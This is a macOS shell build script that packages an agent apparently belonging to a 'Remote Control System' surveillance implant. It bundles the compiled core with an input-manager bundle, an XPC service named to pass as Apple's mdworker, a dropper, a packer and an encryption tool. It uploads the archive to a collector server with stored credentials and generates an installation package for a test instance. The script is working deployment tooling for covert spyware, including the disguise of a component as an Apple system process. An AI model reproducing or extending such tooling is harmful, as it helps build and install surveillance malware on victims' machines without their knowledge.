#
# setting env from project
#
SYNCH_DB=${RCS_TEST_SYNCH}
TOOL_DIR=${SRCROOT}/tools/
TOOL=${SRCROOT}/tools/rcs-core.rb
BUILD_CONF=${SRCROOT}/tools/build.json
HOST=${RCS_TEST_COLLECTOR}
USR=${RCS_TEST_USER}
PASS=${RCS_TEST_PASSWD}
CORE=${TARGET_BUILD_DIR}/${TARGET_NAME}.app/Contents/MacOS/${TARGET_NAME}
INPUTMANAGER=${TARGET_BUILD_DIR}/RCSMInputManager.bundle/Contents/MacOS/RCSMInputManager
XPC=${TARGET_BUILD_DIR}/com.apple.mdworker_server.xpc/Contents/MacOS/com.apple.mdworker_server
OUTPUT_ZIP=${TARGET_BUILD_DIR}/osx.zip
OUTPUT_DIR=${TARGET_BUILD_DIR}/osx
INSTANCE=${RCS_TEST_INSTANCE}

DEBUG_DIR=${RCS_TEST_SHLIB_DIR}
CORE_BUILD_NAME=${TARGET_NAME}

if [ "$SYNCH_DB" == "NO" ]
then
echo "don't synchronize core to DB." > /tmp/db_log.txt
exit
fi

echo "synchronize core to DB" > /tmp/db_log.txt

#. ~/.env
#export GEM_HOME=$GEM_HOME

# create zip archive
echo "creating archive tmp dir..." >> /tmp/db_log.txt 2>&1

rm /tmp/osx.zip
rm -rf /tmp/osx_tmp
mkdir /tmp/osx_tmp

cp $TOOL_DIR/test_parts/default /tmp/osx_tmp/
cp $TOOL_DIR/test_parts/demo_image /tmp/osx_tmp/
cp $TOOL_DIR/test_parts/dropper.exe /tmp/osx_tmp/
cp $TOOL_DIR/test_parts/mpress.exe /tmp/osx_tmp/
cp $TOOL_DIR/test_parts/seg_encrypt.exe /tmp/osx_tmp/
cp $TOOL_DIR/test_parts/version /tmp/osx_tmp/
cp $CORE /tmp/osx_tmp/core

echo "creating archive file..." >> /tmp/db_log.txt 2>&1

/usr/bin/zip -j /tmp/osx.zip /tmp/osx_tmp/core /tmp/osx_tmp/default /tmp/osx_tmp/demo_image /tmp/osx_tmp/dropper.exe /tmp/osx_tmp/seg_encrypt.exe /tmp/osx_tmp/version /tmp/osx_tmp/mpress.exe

sleep 1

# upload archive
DATE_START=`date`
echo "$DATE_START: trying upload the archive to DB..." >> /tmp/db_log.txt 2>&1
echo "$TOOL -d $HOST -u $USR -p $PASS -n osx -R /tmp/osx.zip" >> /tmp/db_log.txt 2>&1
$TOOL -d $HOST -u $USR -p $PASS -n osx -R /tmp/osx.zip >> /tmp/db_log.txt 2>&1

if [ $? -eq 0 ]
then
echo "done!" >> /tmp/db_log.txt 2>&1
else
echo "error: $?" >> /tmp/db_log.txt 2>&1
fi

echo

#
# create package for test instance
#

echo "trying create package for test instance..." >> /tmp/db_log.txt 2>&1
echo "$TOOL -d $HOST -u $USR -p $PASS -f $INSTANCE -b $BUILD_CONF -o $OUTPUT_ZIP" >> /tmp/db_log.txt 2>&1
$TOOL -d $HOST -u $USR -p $PASS -f $INSTANCE -b $BUILD_CONF -o $OUTPUT_ZIP >> /tmp/db_log.txt  2>&1

if [ $? -eq 0 ]
then
echo "done!" >> /tmp/db_log.txt 2>&1
else
echo "error: $?" >> /tmp/db_log.txt 2>&1
fi

echo "The installation package is: $OUTPUT_ZIP" >> /tmp/db_log.txt 2>&1

echo
echo "extracting component files to dir $OUTPUT_DIR" >> /tmp/db_log.txt 2>&1
mkdir $OUTPUT_DIR > /dev/null 2>&1
/usr/bin/unzip -o -d $OUTPUT_DIR $OUTPUT_ZIP >> /tmp/db_log.txt  2>&1
chmod 755 $OUTPUT_DIR/install

echo "build done!" >> /tmp/db_log.txt 2>&1
